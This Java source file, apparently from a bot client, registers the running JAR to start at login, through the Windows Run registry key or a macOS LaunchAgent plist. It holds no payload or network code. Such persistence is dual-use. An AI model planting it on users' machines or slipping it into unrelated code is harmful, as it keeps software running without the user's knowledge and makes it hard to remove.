package bot;

import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;
import oslib.AbstractOperatingSystem;

//import com.redpois0n.oslib.OperatingSystem;
import oslib.OperatingSystem;


public class Startup {

	/**
	 * Adds this file to startup, only osx and windows
	 * @param name
	 * @throws Exception
	 */
	public static final void addToStartup(String name) throws Exception {
		File currentJarFile = Util.getJarFile();
		String currentJar = currentJarFile.getAbsolutePath();	
		
		if (currentJarFile.isFile()) {
                    	AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
			if (os.getType() == OperatingSystem.WINDOWS) {
				String javaHome = System.getProperty("java.home") + "\\bin\\javaw.exe";
				try {
					WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name);
				} catch (Exception ex) {
				}
				WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, "\"" + javaHome + "\" -jar \"" + currentJar + "\"");
			} else if (os.getType() == OperatingSystem.MACOS) {
				// osx startup, stackoverflow http://stackoverflow.com/questions/6442364/running-script-upon-login-mac
				File startupFile = new File(System.getProperty("user.home") + "/Library/LaunchAgents/" + new File(currentJar).getName().replace(".jar", ".plist"));
				PrintWriter out = new PrintWriter(new FileWriter(startupFile));
				out.println("<?xml version=\"1.0\" encoding=\"UTF-8\"?>");
				out.println("<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">");
				out.println("<plist version=\"1.0\">");
				out.println("<dict>");
				out.println("   <key>Label</key>");
				out.println("   <string>" + currentJar.replace("file:", "").replace(".jar", "") + "</string>");
				out.println("   <key>ProgramArguments</key>");
				out.println("   <array>");
				out.println("      <string>" + System.getProperty("java.home").replace(" ", "%20") + System.getProperty("file.separator") + "bin" + System.getProperty("file.separator") + "java</string>");
				out.println("      <string>-jar</string>");
				out.println("      <string>" + currentJar.replace("file:", "") + "</string>");
				out.println("   </array>");
				out.println("   <key>RunAtLoad</key>");
				out.println("   <true/>");
				out.println("</dict>");
				out.println("</plist>");
				out.close();
			}
		}
	}
	
}
